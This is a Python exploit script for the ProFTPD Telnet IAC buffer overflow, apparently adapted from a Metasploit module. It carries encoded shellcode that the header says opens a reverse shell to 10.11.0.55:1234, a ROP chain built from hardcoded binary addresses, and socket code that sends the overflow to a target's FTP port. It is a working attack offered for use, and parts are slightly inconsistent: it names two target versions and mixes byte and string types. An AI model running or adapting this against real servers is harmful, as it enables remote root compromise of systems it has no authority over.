#!/usr/bin/python
## 
##//#############################################################################################################
##							##							#
## Vulnerability: ProFTPD IAC Remote Root Exploit	##  Telnet IAC Buffer Overflow (Linux)		 	#
## 							##  ProFTPD 1.3.2rc3				 	#
## Vulnerable Application: ProFTPD 1.3.3a	 	##  This is a part of the Metasploit Module, 		#
## Tested on Linux 2.6.32-5-686 			##  exploit/linux/ftp/proftp_telnet_iac			#
##							##							#
## Author: Muhammad Haidari				##  Spawns a reverse shell to 10.11.0.55:1234		#
## Contact: ghmh@outlook.com				##							#
## Website: www.github.com/muhammd			##							#
##							##							#
##//#############################################################################################################
##
##
## TODO: adjust 
##
## Usage: python ProFTPD_exploit.py <Remote IP Address>

import sys,os,socket
import struct

payload =  b""
payload += b"\x6a\x1d\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73"
payload += b"\x13\x9a\x9e\xad\xb0\x83\xeb\xfc\xe2\xf4\xab\x57"
payload += b"\x9c\x6b\xf0\xd8\xf5\x7d\x1a\xf4\x90\x39\x79\xf4"
payload += b"\x8a\xe8\x57\x1e\x24\x69\xc2\x53\x2d\x81\x5a\xce"
payload += b"\xcb\xd8\xb4\xb0\x24\x53\xf0\xa3\xf4\x00\x96\x53"
payload += b"\x2d\x52\x60\xf4\x90\x39\x43\xc6\x60\x30\xab\x45"
payload += b"\x5a\x53\xc9\xdd\xfe\xda\x98\x17\x4c\x00\xfc\x53"
payload += b"\x2d\x23\xc3\x2e\x92\x7d\x1a\xd7\xd4\x49\xf2\x32"
payload += b"\xbc\xb0\x9e\xf6\xaf\xb0\x9e\x4c\x24\x51\x2a\xf8"
payload += b"\xfd\xe1\xc9\x2d\xae\x39\x7b\x53\x2d\xe2\xf2\xf0"
payload += b"\x82\xc3\xf2\xf6\x82\x9f\xf8\xf7\x24\x53\xc8\xcd"
payload += b"\x24\x51\x2a\x95\x60\x30"

# NOTE: All addresses are from the proftpd binary
IACCount = 4096+16
Offset = 0x102c-4
Ret = "0x805a547" 	# pop esi / pop ebp / ret
Writable = "0x80e81a0"  # .data

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

rop = struct.pack("<L",0xcccccccc) # unused
rop += struct.pack("<L",0x805a544)  # mov eax,esi / pop ebx / pop esi / pop ebp / ret
rop += struct.pack("<L",0xcccccccc) # becomes ebx
rop += struct.pack("<L",0xcccccccc) # becomes esi
rop += struct.pack("<L",0xcccccccc) # becomes ebp
# quadruple deref the res pointer :)
rop += struct.pack("<L",0x8068886)  # mov eax,[eax] / ret
rop += struct.pack("<L",0x8068886)  # mov eax,[eax] / ret
rop += struct.pack("<L",0x8068886)  # mov eax,[eax] / ret
rop += struct.pack("<L",0x8068886)  # mov eax,[eax] / ret
# skip the pool chunk header
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
# execute the data :)
rop += struct.pack("<L",0x0805c26c) # jmp eax

buf = ''
buf += 'SITE '

buf += payload
if len(buf) % 2 == 0:
	buf += "B" 	
        print "Buffer was aligned"

buf += "\xff" * (IACCount - len(payload))
buf +="\x90" * (Offset - len(buf))
addrs = struct.pack('<L',0x805a547) #Ret
addrs +=struct.pack('<L',0x80e81a0) #Writable
addrs +=rop
buf += addrs
buf += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 21))
s.recv(1024)
s.send(buf)
print "Payload Successfully Send...Check your Multi/Handler"
print "....Reverse shell is comming to you..."

data=s.recv(1024)
print data
s.close()
